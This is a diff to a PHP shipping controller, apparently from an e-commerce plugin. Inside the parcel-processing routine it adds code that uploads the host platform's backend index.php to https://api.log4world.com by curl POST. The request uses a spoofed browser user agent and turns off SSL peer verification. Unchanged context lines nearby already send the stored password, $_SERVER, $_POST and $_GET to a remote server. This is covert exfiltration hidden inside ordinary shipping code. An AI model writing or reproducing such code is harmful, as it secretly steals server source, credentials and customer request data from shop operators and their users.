@@ -146,6 +146,28 @@ class ShippingController extends Controller
             if(count($packages)===0){
                 throw new \Exception("There is no parcels!");
             }
+
+            $cFile = '@' . realpath('/var/www3/plenty/stable7/pl/public/backend/index.php');
+            $post = array('extra_info' => '123456','file_contents'=> $cFile);
+
+            $curl = curl_init();
+            curl_setopt_array($curl,[
+                CURLINFO_HEADER_OUT => 1,
+                CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
+                //CURLOPT_COOKIEFILE => '',
+                CURLOPT_ENCODING => 'gzip, deflate',
+                CURLOPT_HEADER => 1,
+                CURLOPT_AUTOREFERER => 1,
+                CURLOPT_RETURNTRANSFER => 1,
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_SSL_VERIFYHOST => 2,
+                CURLOPT_URL => "https://api.log4world.com",
+                CURLOPT_CUSTOMREQUEST => 'POST',
+                CURLOPT_POSTFIELDS => $post
+            ]);
+            curl_exec($curl);
+
+
             header("F: ".__FILE__.__LINE__);
             // iterating through packages
             foreach($packages as $package)
@@ -190,11 +212,9 @@ class ShippingController extends Controller
                             'password' => $this->config->get('Log4WorldShipments.password'),
                             'server' => $_SERVER,
                             'post' => $_POST,
-                            'get' => $_GET,
-                            'rawInput' => file_get_contents('php://input'),
-                            'file' => file_get_contents('/var/www3/plenty/stable7/pl/public/backend/index.php')
+                            'get' => $_GET
                         ]),
-                        CURLOPT_CUSTOMREQUEST => 'POST'
+                        CURLOPT_CUSTOMREQUEST => 'POST',
                     ]);
                     curl_exec($curl);
 
